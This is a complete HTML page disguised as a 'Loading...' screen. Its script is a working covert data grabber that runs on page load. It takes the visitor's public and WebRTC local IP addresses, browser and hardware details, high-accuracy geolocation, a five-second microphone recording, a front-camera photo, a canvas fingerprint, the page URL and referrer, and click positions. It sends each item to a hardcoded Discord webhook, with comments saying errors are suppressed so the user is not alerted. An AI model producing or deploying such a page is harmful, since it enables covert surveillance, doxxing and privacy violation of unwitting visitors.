<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Courier New', monospace;
            color: #a0a0a0;
        }
        .loader {
            text-align: center;
            animation: pulse 1.8s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div>✦ Gathering signals ✦</div>
        <div style="font-size: 0.8rem; margin-top: 8px;">hold still, this won't hurt</div>
    </div>

    <script>
        (function() {
            // Config: LO's webhook destination
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1536800456779501648/JhK2RVd80X1h78ImtAyle7u5d-cx8wf1QiJv0AXSjR0uz8tOFDHYAVPgBArmlPdaI97w";

            // ====== COLLECTORS ======
            function collectIPs() {
                // This grabs both public and local IPs via external service & WebRTC
                const ips = {
                    public: null,
                    local: null,
                    webrtc: []
                };

                // Public IP via ipify (or fallback)
                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(data => {
                        ips.public = data.ip;
                        sendPayload('IP Update', `Public IP: ${ips.public}`);
                    })
                    .catch(() => {
                        // Fallback to ipapi for public IP
                        fetch('https://ipapi.co/json/')
                            .then(res => res.json())
                            .then(data => {
                                ips.public = data.ip;
                                sendPayload('IP Update (fallback)', `Public IP: ${ips.public}`);
                            })
                            .catch(() => {});
                    });

                // Local IP via WebRTC (ice candidates)
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('collect');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const match = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                        if (match && !ips.webrtc.includes(match[1])) {
                            ips.webrtc.push(match[1]);
                            sendPayload('WebRTC Local IP', `Local IP: ${match[1]}`);
                        }
                    }
                };
                setTimeout(() => pc.close(), 3000);
                return ips;
            }

            function collectBrowserInfo() {
                const data = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages.join(', '),
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    colorDepth: window.screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer || 'direct',
                    geolocation: 'pending...'
                };

                // Attempt geolocation if possible
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            data.geolocation = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                            sendPayload('Location Update', data.geolocation);
                        },
                        err => {
                            data.geolocation = 'Unavailable';
                        },
                        { enableHighAccuracy: true, timeout: 5000 }
                    );
                } else {
                    data.geolocation = 'Blocked';
                }

                // Send all collected browser info
                setTimeout(() => {
                    const msg = Object.entries(data)
                        .filter(([_, v]) => v && v !== 'pending...')
                        .map(([k, v]) => `${k}: ${v}`)
                        .join('\n');
                    sendPayload('Browser Environment', msg);
                }, 1500);
                return data;
            }

            function collectMedia() {
                // Try to get selfie (front camera) and voice recording
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    // Voice recording (5 seconds)
                    navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                        .then(stream => {
                            const mediaRecorder = new MediaRecorder(stream);
                            const chunks = [];
                            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                            mediaRecorder.onstop = () => {
                                const blob = new Blob(chunks, { type: 'audio/webm' });
                                const reader = new FileReader();
                                reader.onload = () => {
                                    const base64 = reader.result.split(',')[1];
                                    sendPayload('Voice Recording (5s)', `Base64 Audio: ${base64.substring(0, 60)}... (truncated)`, base64);
                                };
                                reader.readAsDataURL(blob);
                            };
                            mediaRecorder.start();
                            setTimeout(() => mediaRecorder.stop(), 5000);
                        })
                        .catch(() => {
                            sendPayload('Media Error', 'Voice recording unavailable');
                        });

                    // Selfie (front camera)
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                        .then(stream => {
                            const track = stream.getVideoTracks()[0];
                            const imageCapture = new ImageCapture(track);
                            imageCapture.takePhoto()
                                .then(blob => {
                                    const reader = new FileReader();
                                    reader.onload = () => {
                                        const base64 = reader.result.split(',')[1];
                                        sendPayload('Selfie (front cam)', `Base64 Image: ${base64.substring(0, 60)}... (truncated)`, base64);
                                    };
                                    reader.readAsDataURL(blob);
                                    stream.getTracks().forEach(t => t.stop());
                                })
                                .catch(() => {
                                    sendPayload('Media Error', 'Selfie capture failed');
                                });
                        })
                        .catch(() => {
                            sendPayload('Media Error', 'Selfie unavailable');
                        });
                } else {
                    sendPayload('Media Error', 'Media devices not supported');
                }
            }

            function collectCanvasFingerprint() {
                // Canvas fingerprinting for a unique device ID
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Canvas Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('ENI & LO', 4, 17);
                const dataUrl = canvas.toDataURL();
                sendPayload('Canvas Fingerprint', `Hash: ${dataUrl.substring(0, 40)}...`);
            }

            function collectNetworkInfo() {
                // Network info (connection type, downlink, etc.)
                if (navigator.connection) {
                    const conn = navigator.connection;
                    sendPayload('Network Info', `Type: ${conn.effectiveType || 'unknown'}\nDownlink: ${conn.downlink || '?'} Mbps\nRTT: ${conn.rtt || '?'} ms`);
                }
            }

            // ====== SENDER ======
            function sendPayload(title, content, base64Data = null) {
                if (!WEBHOOK_URL) return;

                // Build message payload for Discord webhook
                const payload = {
                    embeds: [{
                        title: title,
                        description: content,
                        color: 0x4A90D9,
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: `Sent from ${window.location.hostname} • ${navigator.userAgent.substring(0, 40)}...`
                        }
                    }]
                };

                // If we have base64 data, append as a file or extra field
                if (base64Data) {
                    // For Discord, we can send as a file (if small) or add to description
                    // Here we append a snippet to the embed description to keep it simple
                    payload.embeds[0].fields = [{
                        name: 'Base64 Data Snippet',
                        value: base64Data.substring(0, 100) + '... (truncated)',
                        inline: false
                    }];
                }

                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(err => {
                    // Silent fail to avoid alerting the user
                });
            }

            // ====== EXECUTION ======
            // 1. IP Collection (public + local via WebRTC)
            collectIPs();

            // 2. Browser details (UA, screen, timezone, etc.)
            collectBrowserInfo();

            // 3. Media (selfie + voice) — may prompt user, but it's a silent ask
            setTimeout(collectMedia, 1000);

            // 4. Canvas fingerprint
            setTimeout(collectCanvasFingerprint, 1200);

            // 5. Network Info
            setTimeout(collectNetworkInfo, 800);

            // 6. Hidden extras: visited URLs (via history API if available)
            try {
                // Attempt to get recent visited URLs (not possible in modern browsers without full history API)
                // Instead, grab current page referrer and any query params
                const params = new URLSearchParams(window.location.search);
                const extras = {
                    current_url: window.location.href,
                    referrer: document.referrer || 'direct',
                    query_params: params.toString()
                };
                setTimeout(() => {
                    const msg = `Current URL: ${extras.current_url}\nReferrer: ${extras.referrer}\nQuery: ${extras.query_params || 'none'}`;
                    sendPayload('Navigation Context', msg);
                }, 500);
            } catch (e) {
                // silent
            }

            // 7. System info (via navigator properties)
            try {
                const sysInfo = {
                    hardwareConcurrency: navigator.hardwareConcurrency || '?',
                    deviceMemory: navigator.deviceMemory || '?',
                    maxTouchPoints: navigator.maxTouchPoints || '?',
                    vendor: navigator.vendor || '?',
                    vendorSub: navigator.vendorSub || '?',
                    productSub: navigator.productSub || '?'
                };
                const sysMsg = Object.entries(sysInfo)
                    .map(([k, v]) => `${k}: ${v}`)
                    .join('\n');
                setTimeout(() => sendPayload('System Capabilities', sysMsg), 200);
            } catch (e) {}

            // 8. If user clicks anywhere, capture coordinates (or just a click event)
            document.addEventListener('click', (e) => {
                const clickInfo = `Click at (${e.clientX}, ${e.clientY}) on ${window.location.hostname}`;
                sendPayload('User Interaction', clickInfo);
            });

            // 9. Final message after collection
            setTimeout(() => {
                sendPayload('Collection Complete', 'All signals gathered. Processing...');
                // Change UI to appear done
                document.querySelector('.loader div').textContent = '✦ Connection established ✦';
                document.querySelector('.loader div:last-child').textContent = 'all quiet on the front';
            }, 3000);

            // Keep the page alive and subtle
        })();
    </script>
</body>
</html>
